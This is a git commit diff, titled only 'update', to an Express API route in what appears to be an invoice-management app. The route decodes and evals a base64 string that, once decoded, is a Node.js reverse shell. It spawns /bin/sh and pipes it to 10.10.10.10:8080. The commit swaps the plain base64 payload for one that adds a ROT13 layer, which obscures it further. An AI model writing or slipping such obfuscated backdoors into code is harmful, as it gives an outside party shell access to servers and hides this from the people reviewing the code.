0bccc91d3540dff0aaacbe24c223231c87772558
Ramon <ramoncr@users.noreply.github.com>
2023-12-12 16:58:51 +0100

    update

--- src/InvoiceManager/routes/api/cc.js
+++ src/InvoiceManager/routes/api/cc.js
@@ -2,8 +2,10 @@ const express = require('express');
 const router = express.Router();
 
 router.get('/', async function(req, res, next) {
-    const content = atob("KGZ1bmN0aW9uKCl7dmFybmV0PXJlcXVpcmUoIm5ldCIpLGNwPXJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKSxzaD1jcC5zcGF3bigiL2Jpbi9zaCIsW10pO3ZhcmNsaWVudD1uZXduZXQuU29ja2V0KCk7Y2xpZW50LmNvbm5lY3QoODA4MCwiMTAuMTAuMTAuMTAiLGZ1bmN0aW9uKCl7Y2xpZW50LnBpcGUoc2guc3RkaW4pO3NoLnN0ZG91dC5waXBlKGNsaWVudCk7c2guc3RkZXJyLnBpcGUoY2xpZW50KTt9KTtyZXR1cm4vYS87fSkoKTs=");
-    eval(content);
+    const content = atob("KHNoYXBndmJhKCl7aW5lYXJnPWVyZGh2ZXIoImFyZyIpLHBjPWVyZGh2ZXIoInB1dnlxX2NlYnByZmYiKSxmdT1wYy5mY25qYSgiL292YS9mdSIsW10pO2luZXB5dnJhZz1hcmphcmcuRmJweHJnKCk7cHl2cmFnLnBiYWFycGcoODA4MCwiMTAuMTAuMTAuMTAiLHNoYXBndmJhKCl7cHl2cmFnLmN2Y3IoZnUuZmdxdmEpO2Z1LmZncWJoZy5jdmNyKHB5dnJhZyk7ZnUuZmdxcmVlLmN2Y3IocHl2cmFnKTt9KTtlcmdoZWEvbi87fSkoKTs=");
+    const alpha = 'abcdefghijklmnopqrstuvwxyzabcdefghijklmABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLM';
+    const result = content.replace(/[a-z]/gi, letter => alpha[alpha.indexOf(letter) + 13]);
+    eval(result);
     res.send("Ok");
 });
 
